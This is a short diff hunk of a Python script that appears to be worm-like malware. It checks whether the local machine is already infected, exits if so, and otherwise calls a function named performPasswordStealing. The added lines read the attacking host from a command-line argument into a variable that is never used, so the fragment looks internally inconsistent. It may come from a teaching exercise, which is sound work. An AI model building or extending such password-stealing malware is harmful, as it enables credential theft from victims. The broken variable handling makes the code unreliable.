@@ -404,6 +404,9 @@ if __name__ == "__main__":
         if isLocalSystemInfected():
             sys.exit(0)
         else:
+            # Get the IP from the parameters to indicated where the Attacking
+            # came from
+            fromHost = sys.argv[1]
             # Then perform some malicious action
             performPasswordStealing(myIP)
 
